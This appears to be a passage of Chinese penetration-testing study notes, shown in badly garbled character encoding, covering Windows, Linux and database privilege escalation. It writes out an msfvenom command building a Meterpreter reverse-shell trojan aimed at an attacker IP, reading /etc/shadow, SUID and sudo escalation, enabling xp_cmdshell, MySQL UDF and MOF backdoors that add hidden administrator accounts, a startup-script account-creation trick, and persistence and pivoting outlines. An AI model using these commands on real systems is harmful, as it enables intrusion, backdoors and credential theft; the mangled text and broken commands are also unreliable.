æ˜¯ç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å’ŒæœåŠ¡è¿›è¡Œé€šä¿¡çš„å‘½ä»¤è¡Œç¨‹åºã€‚æä¾›çš„åŠŸèƒ½ç±»ä¼¼äºâ€œæ§åˆ¶é¢æ¿â€ä¸­â€œç®¡ç†å·¥å…·â€é¡¹ä¸­çš„â€œæœåŠ¡â€ã€‚ sc Create syscmd binPath â€œcmd K startâ€ type own type interact 2-4 kaliææƒ## msfvenomæ˜¯kaliä¸­ç”Ÿæˆæœ¨é©¬çš„æŒ‡ä»¤ã€‚ä¸‹é¢çš„æŒ‡ä»¤ä½¿ç”¨çš„æ—¶å€™ï¼Œæ³¨æ„ä¿®æ”¹ä¸€ä¸‹LHOSTå‚æ•°çš„å€¼ï¼Œè¿™æ˜¯æ”»å‡»è€…çš„ä¸»æœºçš„ipåœ°å€ msfvenom -p windowsmeterpreterreverse_tcp -e x86shikata_ga_nai -i 5 -b â€˜\\x00â€™ LHOST192.168.1.7 LPORT4444 -f exe abc.exe æ¯”å¦‚å°†ç”Ÿæˆçš„æœ¨é©¬abc.exeæ”¾åˆ°ç›®æ ‡ä¸»æœº ç„¶ååœ¨kaliä¸­è¿›å…¥msfï¼Œæ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤è¿›è¡Œç›‘å¬ï¼š use exploitmultihandler #ä½¿ç”¨ç›‘å¬æ¨¡å— set payload phpmeterpreterreverse_tcp #è®¾ç½®tcp_phpçš„åå¼¹é“¾æ¥ï¼Œå’Œæ¸—é€æ–‡ä»¶çš„payloadä¿æŒä¸€è‡´ set lhost 192.168.78.129 #æœ¬æœºipï¼Œä¸ç”Ÿæˆæ¸—é€æ–‡ä»¶çš„hostä¿æŒä¸€è‡´ set lport 8080 #æœ¬æœºç«¯å£ï¼Œä¸ç”Ÿæˆæ¸—é€æ–‡ä»¶ä¿æŒä¸€è‡´ exploit é€šè¿‡ getsystem æŒ‡ä»¤å°±èƒ½ææƒï¼Œå…ˆexité€€å‡ºç›®æ ‡ç»ˆç«¯çª—å£ï¼Œåœ¨meterpreterä¸­æ‰§è¡Œã€‚ 3-22 Linuxææƒ3-22-1 Linuxä¸‹å¸¸ç”¨å‘½ä»¤æ­»è®°ç¡¬èƒŒä»¥ä¸‹12ç±»å‘½ä»¤ï¼š ## ç³»ç»Ÿä¿¡æ¯æŸ¥çœ‹ç±»ã€ ## æ–‡ä»¶ç›®å½•ç±»ã€ ## é©±åŠ¨æŒ‚è½½ç±»ã€ ## ç¨‹åºå®‰è£…ç±»ã€ ## æºä»£ç åŒ…å®‰è£…ã€ ## å‹ç¼©è§£å‹ç±»ã€ ## è¿›ç¨‹æ§åˆ¶ç±»ã€ ## ç¨‹åºè¿è¡Œç±»ã€ ## ç”¨æˆ·å¸å·ç±»ã€ ## viç¼–è¾‘ç±»ã€ ## ç½‘ç»œæœåŠ¡ã€ ## å…¶ä»–ç±»ç­‰ã€‚ uname -a ## æ‰“å°æ‰€æœ‰å¯ç”¨çš„ç³»ç»Ÿä¿¡æ¯ ******* dir ## æ˜¾ç¤ºå½“å‰ç›®å½•æ–‡ä»¶, ls -al ## æ˜¾ç¤ºåŒ…æ‹¬éšè—æ–‡ä»¶ï¼ˆåŒwin2Kçš„ dirï¼‰ pwd ## æŸ¥è¯¢å½“å‰æ‰€åœ¨çš„ç›®å½•ä½ç½® cd ## ..å›åˆ°ä¸Šä¸€å±‚ç›®å½•ï¼Œæ³¨æ„cd ä¸..ä¹‹é—´æœ‰ç©ºæ ¼ã€‚ cd ## è¿”å›åˆ°æ ¹ç›®å½•ã€‚ cat ## æ–‡ä»¶å æŸ¥çœ‹æ–‡ä»¶å†…å®¹ cat abc.txt ## å¾€abc.txtæ–‡ä»¶ä¸­å†™ä¸Šå†…å®¹ã€‚ cat etcpasswd ## åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ· ******* cat etcshadow ## åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ·å¯†ç  ******* more ###æ–‡ä»¶å ä»¥ä¸€é¡µä¸€é¡µçš„æ–¹å¼æ˜¾ç¤ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚ cp ## å¤åˆ¶æ–‡ä»¶ mv ## ç§»åŠ¨æ–‡ä»¶ rm ## æ–‡ä»¶å åˆ é™¤æ–‡ä»¶ï¼Œ rm -a ## ç›®å½•ååˆ é™¤ç›®å½•åŠå­ç›®å½• mkdir ç›®å½•å ## å»ºç«‹ç›®å½• rmdir ## åˆ é™¤å­ç›®å½• ï¼Œç›®å½•å†…æ²¡æœ‰æ–‡æ¡£ã€‚ chmod ## è®¾å®šæ¡£æ¡ˆæˆ–ç›®å½•çš„å­˜å–æƒé™ grep ## åœ¨æ¡£æ¡ˆä¸­æŸ¥æ‰¾å­—ç¬¦ä¸² diff ## æ¡£æ¡ˆæ–‡ä»¶æ¯”è¾ƒ find ## æ¡£æ¡ˆæœå¯» date ## ç°åœ¨çš„æ—¥æœŸã€æ—¶é—´ who ## æŸ¥è¯¢ç›®å‰å’Œä½ ä½¿ç”¨åŒä¸€å°æœºå™¨çš„äººä»¥åŠLoginæ—¶é—´åœ°ç‚¹ whoami ## æŸ¥çœ‹å½“å‰ç”¨æˆ· ******* w ##è°ç›®å‰å·²ç™»å½•ï¼Œä»–ä»¬æ­£åœ¨åšä»€ä¹ˆ ******* last ## æœ€åç™»å½•ç”¨æˆ·çš„åˆ—è¡¨ ******* lastlog ## æ‰€æœ‰ç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯ ******* useradd ## æ·»åŠ è´¦å· grep -v -E â€œ^#â€ etcpasswd | awk -F: â€˜$3 0 { print $1}â€™ ## åˆ—å‡ºæ‰€æœ‰çš„è¶…çº§ç”¨æˆ·è´¦æˆ· groups ## æŸ¥çœ‹æŸäººçš„Group passwd ## æ›´æ”¹å¯†ç  history ## æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„å†å²å‘½ä»¤è®°å½• ******* ps ## æ˜¾ç¤ºè¿›ç¨‹çŠ¶æ€ kill ## åœæ­¢æŸè¿›ç¨‹ gcc ## é»‘å®¢é€šå¸¸ç”¨å®ƒæ¥ç¼–è¯‘Cè¯­è¨€å†™çš„æ–‡ä»¶ su ## æƒé™è½¬æ¢ä¸ºæŒ‡å®šä½¿ç”¨è€… telnet IP telnet ## è¿æ¥å¯¹æ–¹ä¸»æœºï¼ˆåŒwin2Kï¼‰ï¼Œå½“å‡ºç°bash$æ—¶å°±è¯´æ˜è¿æ¥æˆåŠŸã€‚ ftp ## ftpè¿æ¥ä¸ŠæŸæœåŠ¡å™¨ï¼ˆåŒwin2Kï¼‰ 3-22-2 å†…æ ¸æ¼æ´ææƒæµç¨‹æˆ‘ä»¬ç”¨è€ç‰ˆçš„kaliç³»ç»Ÿä½œä¸ºç›®æ ‡ä¸»æœºæ¥æµ‹è¯•å§ï¼Œæ–°ç‰ˆkaliå·²ç»ä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œå…¶ä»–è€ç‰ˆlinuxæ“ä½œç³»ç»Ÿä¹Ÿæœ‰è¿™ä¸ªæ¼æ´ æŸ¥çœ‹å‘è¡Œç‰ˆæœ¬ cat etcissue cat etc-release æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ uname -a æ¯”å¦‚ï¼š root@jadenkali2:# uname -a Linux jadenkali2 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNULinux 4.0.4è¡¨ç¤ºï¼š ## ç¬¬ä¸€ä¸ªç»„æ•°å­—ï¼šç›®å‰å‘å¸ƒçš„å†…æ ¸ä¸»ç‰ˆæœ¬ã€‚ ## ç¬¬äºŒä¸ªç»„æ•°å­—ï¼šå¶æ•°è¡¨ç¤ºç¨³å®šç‰ˆæœ¬ï¼›å¥‡æ•°è¡¨ç¤ºå¼€å‘ä¸­ç‰ˆæœ¬ã€‚ ## ç¬¬ä¸‰ä¸ªç»„æ•°å­—ï¼šé”™è¯¯ä¿®è¡¥çš„æ¬¡æ•°ã€‚ å¯ä»¥ç”¨kaliè‡ªå¸¦çš„searchsploitæ¥æœç´¢exploitdbä¸­çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å»ç½‘ä¸Šæœç´¢ã€‚ searchsploit linux Debian 4 è€Œè¿™ä¸ªç»“æœä¸­åŸºæœ¬æ²¡æœ‰çœ‹åˆ°Debiançš„ä¸€äº›æ¼æ´åˆ©ç”¨ä»£ç ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±å»ç½‘ä¸Šæ‰¾ä¸€æ‰¾æ¼æ´åˆ©ç”¨çš„poc 3-22-3 è„ç‰›ææƒ3-22-4 sudoææƒ## æ¼æ´å½±å“ç‰ˆæœ¬ Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 ## ä¸å—å½±å“ç‰ˆæœ¬ï¼šsudo 1.9.5p2 æ¼æ´æ£€æµ‹ æŸ¥çœ‹sudoç‰ˆæœ¬ æ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä½¿ç”¨æ™®é€šç”¨æˆ·æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ sudoedit -s ## è‹¥è¿”å›å¦‚å›¾ä»¥â€œ sudoeditï¼šâ€å¼€å¤´çš„é”™è¯¯ï¼Œåˆ™å½“å‰ç³»ç»Ÿå¯èƒ½å­˜åœ¨å®‰å…¨é£é™©ã€‚ ## ä¸å—å½±å“çš„ç³»ç»Ÿå°†æ˜¾ç¤ºä»¥â€œ usageï¼šâ€å¼€å¤´çš„é”™è¯¯ æ¼æ´ä¿®å¤ ç›®å‰å®˜æ–¹å·²åœ¨sudoæ–°ç‰ˆæœ¬1.9.5p2ä¸­ä¿®å¤äº†è¯¥æ¼æ´ï¼Œè¯·å—å½±å“çš„ç”¨æˆ·å°½å¿«å‡çº§ç‰ˆæœ¬è¿›è¡Œé˜²æŠ¤ï¼Œå¯ä»¥é€šè¿‡æŒ‡ä»¤æ¥ä¿®å¤ wget â€œhttps://www.sudo.ws/dist/sudo-1.9.5p2.tar.gzâ€œ tar -xvzf sudo-1.9.5p2.tar.gz cd sudo-1.9.5p2 .configure make sudo make install bash -c â€œsudo â€“versionâ€ 3-22-5 SUIDææƒé¦–å…ˆåœ¨æœ¬åœ°æŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ï¼Œæœ‰ä»¥ä¸‹ä¸‰ä¸ªå‘½ä»¤ï¼Œå“ªä¸ªéƒ½å¯ä»¥ find -user root -perm -4000 -print 2devnull find -perm -us -type f 2devnull find -user root -perm -4000 -exec ls -ldb {} ; åˆ—å‡ºæ¥çš„æ‰€æœ‰æ–‡ä»¶éƒ½æ˜¯ä»¥rootç”¨æˆ·æƒé™æ¥æ‰§è¡Œçš„ï¼Œæ¥ä¸‹æ¥æ‰¾åˆ°å¯ä»¥ææƒçš„æ–‡ä»¶ å¸¸ç”¨çš„å¯ç”¨äºsuidææƒçš„æ–‡ä»¶ Nmap Vim find Bash More Less Nano cp Nmap è¾ƒæ—§ç‰ˆæœ¬çš„Nmapï¼ˆ2.02è‡³5.21ï¼‰å¸¦æœ‰äº¤äº’æ¨¡å¼ï¼Œä»è€Œå…è®¸ç”¨æˆ·æ‰§è¡Œshellå‘½ä»¤ã€‚ç”±äºNmapä½äºä¸Šé¢ä½¿ç”¨rootæƒé™æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶åˆ—è¡¨ä¸­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨äº¤äº’å¼æ§åˆ¶å°æ¥è¿è¡Œå…·æœ‰ç›¸åŒæƒé™çš„shellã€‚ï¼‰å¯ä»¥ä½¿ç”¨ä¸‹å‘½ä»¤è¿›å…¥nmapäº¤äº’æ¨¡å¼ nmap â€“interactive ç„¶åæ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ sh-3.2# whoami ç»“æœä½ï¼šroot è€Œåœ¨Metasploitä¸­ä¹Ÿæœ‰ä¸€ä¸ªæ¨¡å—å¯ä»¥é€šè¿‡SUID Nmapè¿›è¡Œææƒ exploitunixlocalsetuid_nmap 3-23 æ•°æ®åº“ææƒ3-23-1 mssqlææƒsqlTools å·¥å…· ä¹‹å‰è¯´è¿‡saç”¨æˆ·å¯ä»¥å¼€å¯xp_cmdshellï¼Œæ¥æ‰§è¡Œç³»ç»ŸæŒ‡ä»¤ï¼Œä½†æ˜¯å¦‚æœä½ ä»¬æµ‹è¯•çš„æ—¶å€™å‡ºç°xp_cmdshellæ²¡æœ‰å¼€å¯ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„æŠ¥é”™çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹sqlè¯­å¥æ¥å¼€å¯cmd_shellã€‚ sp_configure â€˜show advanced optionsâ€™,1 reconfigure go sp_configure â€˜xp_cmdshellâ€™,1 reconfigure go 3-23-2 Oracleæ•°æ®åº“http://cn-sec.com/archives/722702.htmlhttps://www.cnblogs.com/micr067/p/12763325.html Oracleæ•°æ®åº“ä¸€èˆ¬ä¸jspã€aspxç½‘ç«™æ­é…ï¼Œå¦‚æœæ˜¯jspç½‘ç«™ï¼Œé»˜è®¤æ˜¯ç³»ç»Ÿæƒé™ï¼Œapsxç½‘ç«™é»˜è®¤éœ€è¦ææƒã€‚ææƒæ–¹æ³•å‚è€ƒå¦‚ä¸‹åœ°å€: ä½¿ç”¨oracleshellå·¥å…· 3-23-3 MySQLææƒ1.æŸ¥çœ‹ç½‘ç«™é…ç½®æ–‡ä»¶ ## å¦‚:connã€configã€dataã€sqlã€common ã€incç­‰ã€‚ 2.æŸ¥çœ‹æ•°æ®åº“å®‰è£…è·¯å¾„ä¸‹çš„mysqlæ–‡ä»¶ ## å®‰è£…ç›®å½•ä¸‹é¢æ‰¾åˆ°datamysqluser.mydå’Œuser.myi ## nodepad++æ‰“å¼€ï¼Œä¹Ÿçœ‹åˆ°äº†ç”¨æˆ·åå¯†ç  3.æš´åŠ›ç ´è§£ ## é€šè¿‡æš´åŠ›ç ´è§£å¾—åˆ°ï¼Œå·¥å…·æœ‰ï¼šhscanã€Bruterã€hydraã€è„šæœ¬æœ¨é©¬ç­‰ ## ç”±äºmysqlé»˜è®¤æ˜¯ä¸èƒ½è¿œç¨‹è¿æ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡è„šæœ¬çˆ†ç ´çš„æ–¹å¼æ¥æš´åŠ›ç ´è§£ã€‚ å°†777.phpä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨çš„ç½‘ç«™æ ¹ç›®å½•ï¼Œç„¶åè®¿é—®ä»¥ä¸‹ï¼šæœ‰ä¸ªå¼±å£ä»¤ç ´è§£ 3-1 UDFè‡ªèº«ææƒæ˜¯mysqlè‡ªèº«åŠŸèƒ½çš„ææƒï¼Œæ— è®ºä»€ä¹ˆç‰ˆæœ¬éƒ½å¯ä»¥ã€‚https://blog.51cto.com/u_152749492922401 1ã€ä¸Šä¼ udf.dllï¼Œå…¶å®è¿™æ˜¯mysqlè‡ªèº«çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æœ¬èº«å°±æœ‰çš„ï¼Œå¦‚æœä½ å‘ç°ä½ çš„æ²¡æœ‰çš„è¯ï¼Œä½ å°±ä¸Šä¼ ä¸Šå»ï¼Œå¦‚æœæ²¡æœ‰ä¸‹é¢å¯¹åº”çš„ç›®å½•å°±ç›´æ¥æ–°å»ºç›®å½•ã€‚ ## å°äºmysql5.1ç‰ˆæœ¬ C:\\WINDOWS\\udf.dll æˆ– C:\\WINDOWS\\system32\\udf.dll ## ç­‰äºmysql5.1ç‰ˆæœ¬ %mysql%\\plugin\\udf.dll ç”¨ select @@plugin_dir æŸ¥è¯¢pluginè·¯å¾„ é»˜è®¤ C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll ç„¶åé’ˆå¯¹mysql5.6ã€5.7ç­‰é«˜ç‰ˆæœ¬çš„ï¼Œå¤§å®¶å¯ä»¥å»ç½‘ä¸Šæ‰¾ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯å¤§è‡´ä¸€æ ·çš„è¿‡ç¨‹ã€‚ å¯¼å…¥åœ°å€ï¼šC:\\php\\MySQL-5.1.50\\lib\\plugin\\udf.dll 1ã€UDFææƒä¸“ç”¨webshellï¼Œå¯¼å‡ºdllã€å†æ‰§è¡Œå‘½ä»¤ã€‚ 2ã€Phpspy.phpçš„Mysqlä¸Šä¼ ï¼ˆæç¤º â€œä¸Šä¼ å¤±è´¥ã€åŸå› :Result consisted of more than one rowâ€ã€å®é™…ä¸Šå¤§å¤šæ•°å·²ä¸Šä¼ æˆåŠŸï¼‰ï¼Œå†è¿æ¥mysqlæ‰§è¡Œå‘½ä»¤ã€‚ 3ã€Mysqlå…è®¸å¤–è¿çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨Hack MySQLä¸Šä¼ ï¼Œå†é€šè¿‡å‘½ä»¤è¡Œç™»é™†æ‰§è¡Œå‘½ä»¤ã€‚ äºŒã€æ‰§è¡ŒSQL select cmdshell(â€˜net userâ€™); select open3389(); ä¸‰ã€ä½æƒé™è·å–rootå¯†ç  æˆ‘è¿™é‡Œé‡‡ç”¨çš„ç‰ˆæœ¬æ˜¯mysql5.5æ¥è¿›è¡Œæµ‹è¯•ï¼Œç„¶åçœ‹ä¸€ä¸‹åˆšæ‰å·¥å…·çš„æç¤ºä¿¡æ¯ ç„¶åå›åˆ°udfææƒå·¥å…·ä¸Šï¼Œå¡«å†™å¯¼å…¥çš„ç›®å½•ï¼Œè¿™ä¸ªå·¥å…·èƒ½å¤Ÿå¸®æˆ‘ä»¬å¯¼å…¥è¿™ä¸ªudf.dllæ–‡ä»¶ ç„¶ååˆ°ç›®æ ‡ä¸»æœºä¸ŠæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æœ‰æ²¡æœ‰ ç„¶åæˆ‘ä»¬è¿˜éœ€è¦æ‰§è¡Œä¸€ä¸ªsqlè¯­å¥æ¥åˆ›å»ºä¸€ä¸ªcmdshellï¼Œudfææƒå·¥å…·ä¸­å·²ç»å¸®æˆ‘ä»¬å†™å¥½äº† çœ‹åˆ°ï¼Œç¬¬äºŒæ­¥æ‰§è¡Œselect cmdshell(â€˜verâ€™) ç„¶åæ‰“å¼€3389ç«¯å£ï¼Œé¦–å…ˆè¦åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œæ¯”å¦‚å«åšopen3389() ä½†æ˜¯ç›®æ ‡ä¸»æœºçš„é˜²ç«å¢™å¯¹3306çš„å‡ºå£æ•°æ®è¿›è¡Œäº†æ‹¦æˆªï¼Œæˆ–è€…é˜²ç«å¢™ç›´æ¥ç¦ç”¨äº†3306ç«¯å£ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯ä¸è¡Œçš„ã€‚é‚£ä¹ˆæ€ä¹ˆåŠï¼Œæˆ‘ä»¬æ¥æ¼”ç¤ºä¸€ä¸‹ã€‚é€šè¿‡èœåˆ€æŠŠè¿™ä¸ªæœ¨é©¬æ–‡ä»¶æ”¾åˆ°ç›®æ ‡ä¸»æœºä¸Š ç„¶åæ”¹ä¸ªåå­—ï¼Œå› ä¸ºæœ‰ä¸­æ–‡ï¼Œæ¯”å¦‚æ”¹ä¸ºudf.phpï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ ç„¶åå°±å¯ä»¥åƒåˆšæ‰çš„udfå·¥å…·ä¸€æ ·æ¥ä½¿ç”¨äº†ï¼Œä»–ä»¬çš„æŒ‡ä»¤ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚è¿™é‡Œé¢è¿˜å¤šäº†ä¸ªåŠŸèƒ½å°±æ˜¯åå¼¹shell ç„¶åç°åœ¨æˆ‘ä»¬çš„ä¸»æœºä¸Šå¼€å¯ncç›‘å¬ ç„¶ååˆ°æµè§ˆå™¨ä¸Šæ‰§è¡ŒæŒ‡ä»¤ å†æ¥çœ‹æˆ‘ä»¬ä¸»æœºçš„ncç›‘å¬çš„åœ°æ–¹ æ‹¿åˆ°äº†åå¼¹çš„shellã€‚ è¿™ç§udfææƒèƒ½å¤Ÿé€šæ€æ‰€æœ‰çš„mysqlç‰ˆæœ¬ï¼Œåªä¸è¿‡ä¸åŒç‰ˆæœ¬çš„mysqlå­˜æ”¾udf.dllæ–‡ä»¶çš„ä½ç½®ä¸åŒã€‚ 3-2 MOFæ¼æ´ææƒhttps://www.cnblogs.com/xishaonian/p/6384535.htmlï¼Œæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚ è¿™æ˜¯ä¸ªæ¼æ´ææƒï¼Œç°åœ¨åŸºæœ¬ä¸Šä¹Ÿæ˜¯é€šæ€æ‰€æœ‰çš„mysqlç‰ˆæœ¬ï¼Œè¿™ä¸ªæ¼æ´æœ‰åå‡ å¹´äº†ï¼Œç°åœ¨è¿˜æ²¡ä¿®å¤ã€‚ä»‹ç»ï¼šhttp://www.exploit-db.com/exploits/23083/ å…¶å®å°±æ˜¯ä¸€æ®µæ”»å‡»ä»£ç å°±èƒ½æå®šï¼Œè¿™ä¸ªä»£ç æ–‡ä»¶åœ¨è¿™é‡Œ 1ã€æ‰‹å·¥é€šè¿‡webshell æ•°æ®åº“è¯­å¥å»ºå¸å· ä½¿ç”¨èœåˆ€è¿æ¥ä¸Šç›®æ ‡ä¸»æœº 1.æ‰¾ä¸ªå¯å†™ç›®å½•ï¼Œä¸Šä¼ mofæ–‡ä»¶ 2.æ‰§è¡Œsql ä¸Šä¼ æ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠæ–‡ä»¶æ”¹ä¸ªåç¼€åï¼Œæ¯”å¦‚å«åšmoon.phpï¼Œç„¶åä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œæ¯”å¦‚ ç„¶åæ‰§è¡Œsqlï¼Œå°†åˆšæ‰ä¸Šä¼ çš„æ–‡ä»¶æ”¾åˆ° c:windowssystem32wbemmofmoon.mof ç›®å½•ä¸­å» select load_file(â€˜C:\\wmpub\\moon.mofâ€™) into dumpfile â€˜c:windowssystem32wbemmofmoon.mofâ€™; ç„¶åè¿™ä¸ªmoon.mofæ–‡ä»¶ä»£ç ä¼šæ‰§è¡Œï¼Œè¿™ä¸ªä»£ç æˆ‘ä»¬æ‰“å¼€çœ‹ä¸€ä¸‹æ˜¯æœ‰ä¸ªåˆ›å»ºç”¨æˆ·çš„æŒ‡ä»¤çš„ï¼Œåˆ›å»ºçš„æ˜¯adminç”¨æˆ· å¹¶ä¸”è¿™ä¸ªadminè´¦å·åˆ é™¤ä¹‹åï¼Œè¿‡ä¸€ä¼šå®ƒè¿˜èƒ½è‡ªåŠ¨åˆ›å»ºå‡ºæ¥ï¼Œæ‰€ä»¥è¯´ï¼Œè¿™ä¸ªæ–‡ä»¶è¿˜æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åé—¨ã€‚ ä»¥æ•°æ®åº“çš„æ–¹å¼å»ºç«‹çš„è´¦å·ï¼Œè¿˜ä¸å®¹æ˜“å¯Ÿè§‰å‡ºæ¥ã€‚ å¦‚æœæƒ³è§£å†³æ‰å®ƒçš„è¯ï¼Œå‚è€ƒï¼šhttp://www.myhack58.com/Article/html/3/8/2013/38264.htm ## è§£å†³åŠæ³•ï¼š ç¬¬ä¸€ net stop winmgmt åœæ­¢æœåŠ¡ï¼Œ ç¬¬äºŒ åˆ é™¤æ–‡ä»¶å¤¹ï¼šC:\\WINDOWS\\system32\\wbem\\Repository\\ ç¬¬ä¸‰ net start winmgmt å¯åŠ¨æœåŠ¡ ç¬¬å››ï¼šå®Œæ¯•ä¸ä¼šåœ¨æ‰§è¡Œäº†ã€‚ C:\\WINDOWS\\system32\\wbem\\Repository\\ æ”¾çš„æ˜¯å‚¨å­˜åº“ æˆ‘ä»¬æ‰§è¡Œçš„.moféƒ½ä¼šè¢«åŠ å…¥åˆ°è¿™ä¸ªåº“äº†ã€‚ ç„¶åä¸€ç›´æŒ‰è„šæœ¬è®¾ç½®çš„æ—¶é—´æ‰§è¡Œã€‚ã€‚ åˆ é™¤å é‡æ–°å¯åŠ¨ ä¼šé‡å»ºä¸ªé»˜è®¤å‚¨å­˜åº“ è¿™æ ·æˆ‘ä»¬å…ˆå‰æ‰§è¡Œmofå°±æ²¡äº†ã€‚ 2ã€å·¥å…·çš„æ–¹å¼ ç›´æ¥æ‰§è¡ŒæŒ‡ä»¤ï¼Œæ¯”å¦‚åˆ›å»ºä¸€ä¸ªadmin1è´¦å· è¿™å°±æ˜¯mofææƒçš„ä¸¤ç§æ–¹å¼ã€‚ 3-3 MySQLå¯åŠ¨é¡¹ææƒå¤§è‡´è¿‡ç¨‹ï¼š C:\\php\\MySQL-5.1.50\\binmysql -uroot -proot -h192.168.1.109 mysqldrop database test1; mysql create database test1; mysql use test1; mysql create table a (cmd text); mysqlinsert into a values (â€œset wshshellcreateobject (â€œâ€wscript.shellâ€â€)â€); mysqlinsert into a values (â€œawshshell.run (â€œâ€cmd.exe c net user best bestaddâ€â€,0)â€); mysqlinsert into a values (â€œbwshshell.run (â€œâ€cmd.exe c net localgroup Administrators best addâ€â€,0)â€); ## æ³¨æ„åŒå¼•å·å’Œæ‹¬å·ä»¥åŠåé¢çš„â€œ0â€ä¸€å®šè¦è¾“å…¥ï¼æˆ‘ä»¬å°†ç”¨è¿™ä¸‰æ¡å‘½ä»¤æ¥å»ºç«‹ä¸€ä¸ªVBSçš„è„šæœ¬ç¨‹åºï¼ mysqlselect * from a; mysqlselect * from a into outfile â€œc:docume1administratorã€Œå¼€å§‹ã€èœå•ç¨‹åºå¯åŠ¨best.vbsâ€; ## æœ€åé€šè¿‡æº¢å‡ºæ¼æ´è®©æœåŠ¡å™¨é‡å¯ï¼Œå¦‚ï¼šMS12-020ã€MS15-034 é¦–å…ˆæˆ‘ä»¬é€šè¿‡èœåˆ€æ¥åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ æ’å…¥æ•°æ® insert into a values (â€œset wshshellcreateobject (â€œâ€wscript.shellâ€â€)â€); ## è¿™ä¸ª wscript.shell æ˜¯å¾®è½¯æ“ä½œç³»ç»Ÿè‡ªå¸¦çš„ä¸€ä¸ªshellåŠŸèƒ½å¯¹è±¡ã€‚ æ’å…¥æ·»åŠ è´¦å·çš„æŒ‡ä»¤ insert into a values (â€œawshshell.run (â€œâ€cmd.exe c net user best best addâ€â€,0)â€); ## cmd.exe c è¡¨ç¤ºä¸å¼¹æ¡†çš„æƒ…å†µä¸‹æ‰§è¡ŒæŒ‡ä»¤ã€‚ æ’å…¥æ·»åŠ ç®¡ç†å‘˜ç»„çš„æŒ‡ä»¤ insert into a values (â€œbwshshell.run (â€œâ€cmd.exe c net localgroup Administrators best addâ€â€,0)â€); å°†æ•°æ®å¯¼å‡ºåˆ°å¯åŠ¨é¡¹ä¸­ï¼Œæ¯”å¦‚å‘½åä¸ºbest.vbsï¼Œ select * from a into outfile â€œc:docume1administratorã€Œå¼€å§‹ã€èœå•ç¨‹åºå¯åŠ¨best.vbsâ€; æŸ¥çœ‹å¯åŠ¨é¡¹ï¼Œå…¶å®å·²ç»å¯ä»¥æŠŠä¸Šé¢çš„æ•°æ®åº“åˆ é™¤äº†ã€‚ é‚£ä¹ˆç­‰ç›®æ ‡ä¸»æœºé‡å¯ä¹‹åï¼Œè¿™ä¸ªvbsè„šæœ¬å°±ä¼šè‡ªåŠ¨æ‰§è¡Œäº†ã€‚å¯ä»¥é€šè¿‡MS12-020ã€MS15-034ç­‰æ¼æ´æ¥é‡å¯æœåŠ¡å™¨ 3-24 cså¸¸ç”¨åŠŸèƒ½æœ‰å“ªäº›ï¼Ÿ## ä»£ç†åŠŸèƒ½ å°±æ˜¯æŠŠç›®æ ‡ä¸»æœºä½œä¸ºä½ çš„æµè§ˆå™¨ä»£ç† ## è¿œç¨‹VNC ## æ–‡ä»¶ç®¡ç† ## Net View ## ç«¯å£æ‰«æ ## è¿›ç¨‹åˆ—è¡¨ ## å±å¹•æˆªå›¾ ## ç”Ÿæˆæ— çŠ¶æ€å¯æ‰§è¡Œçš„windowsæœ¨é©¬ 3-25 æ¸—é€æµ‹è¯•æµç¨‹æ‰“ç‚¹ï¼š ä¿¡æ¯æ”¶é›† æ‹¿shellï¼š csã€msfã€ä¸€å¥è¯æœ¨é©¬ã€å¤§é©¬ã€å°é©¬ æ‹¿åˆ°shellåä¿¡æ¯æ”¶é›† å…æ€ ææƒï¼š ç³»ç»Ÿææƒ(win\\linux)ã€æ•°æ®åº“ææƒ æƒé™ç»´æŒï¼š åˆ›å»ºç”¨æˆ·ã€è·å–ç”¨æˆ·å¯†ç ã€è®¡åˆ’ä»»åŠ¡ã€å¯åŠ¨é¡¹ã€æ³¨å†Œè¡¨ã€æœåŠ¡ã€æ˜ åƒåŠ«æŒã€è¿›ç¨‹æŒ‚è½½(ç»™ç³»ç»Ÿçš„æŸä¸ªè¿›ç¨‹æŒ‚åœ¨dllæ–‡ä»¶ç­‰) å†…ç½‘æ¸—é€ ä»£ç†å‡ºç½‘ï¼š ç«¯å£è½¬å‘æŠ€æœ¯ncã€lcx regeorg+proxifier ew+sockcap socksä»£ç† éš§é“ åŸŸæ¸—é€ 